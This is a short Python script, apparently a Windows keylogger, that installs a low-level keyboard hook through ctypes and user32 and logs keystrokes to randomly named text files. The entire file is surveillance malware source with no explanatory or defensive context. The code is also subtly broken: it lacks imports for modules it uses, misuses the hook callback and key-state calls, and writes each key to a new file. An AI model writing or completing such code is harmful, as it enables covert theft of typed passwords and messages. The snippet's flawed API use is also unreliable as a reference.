```python
import ctypes
import os

user32 = ctypes.WinDLL('user32', use_last_error=True)

def on_press(key):
    try:
        filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '.txt'
        with open(filename, 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(str(key))
    except Exception:
        pass

def hook_proc(event):
    if event == 1:
        key = user32.GetAsyncKeyState(event)
        on_press(key)

hook = user32.SetWindowsHookExA(13, hook_proc, None, 0)
if not hook:
    raise Exception('Failed to set hook')

try:
    msg = ctypes.wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
        pass
except KeyboardInterrupt:
    pass
finally:
    user32.UnhookWindowsHookEx(hook)
```